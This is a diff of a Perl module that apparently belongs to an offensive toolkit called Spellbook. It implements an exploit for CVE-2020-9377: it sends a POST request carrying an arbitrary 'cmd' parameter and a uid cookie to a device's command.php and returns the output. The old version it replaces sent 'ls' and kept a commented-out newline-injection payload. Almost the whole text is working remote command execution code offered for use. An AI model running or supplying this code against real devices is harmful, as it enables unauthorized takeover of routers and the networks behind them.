@@ -1,26 +1,51 @@
 package Spellbook::Advisory::CVE_2020_9377 {
     use strict;
     use warnings;
-    use Mojo::UserAgent;
-
+    use Spellbook::Core::UserAgent;
+    
     sub new {
-        my $target = $ARGV[0];
-        my $port   = $ARGV[1];
+        my ($self, $parameters) = @_;
+        my ($help, $target, $cookie, $command, @results);
 
-        if (($target) && ($port)) {
-            my $endpoint = "http://$target:$port/command.php";
-            
-            my $payload  = {
-                Cookie => "",
-                cmd => "ls"
-            };
+        Getopt::Long::GetOptionsFromArray (
+            $parameters,
+            "h|help"     => \$help,
+            "t|target=s" => \$target,
+            "c|cookie=s" => \$cookie,
+            "p|payload=s" => \$command
+        );
 
-            # my $payload  = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
+        if ($target) {
+            if ($target !~ /^http(s)?:\/\//) {
+                $target = "http://$target";
+            }
+
+            my $userAgent = Spellbook::Core::UserAgent -> new();
             
-            my $ua = Mojo::UserAgent -> new ();
-            my $response = $ua -> post ($endpoint, $payload);
-            
-            print $response -> content();
+            my $headers   = HTTP::Headers -> new (
+                "Content-Type" => "application/x-www-form-urlencoded",
+                "Cookie" => "uid=$cookie"
+            );
+
+            my $payload   = "cmd=$command";
+            my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
+            my $response  = $userAgent -> request($request);
+
+            if ($response -> code() == 200) {
+                push @results, $response -> content();
+            }
+
+            return @results;
+        }
+
+        if ($help) {
+            return "
+                \rAdvisory::CVE_2020_9377
+                \r=======================
+                \r-h, --help     See this menu
+                \r-t, --target   Define a target
+                \r-c, --cokie    cookie
+                \r-p, --payload  command\n\n";
         }
 
         return 0;
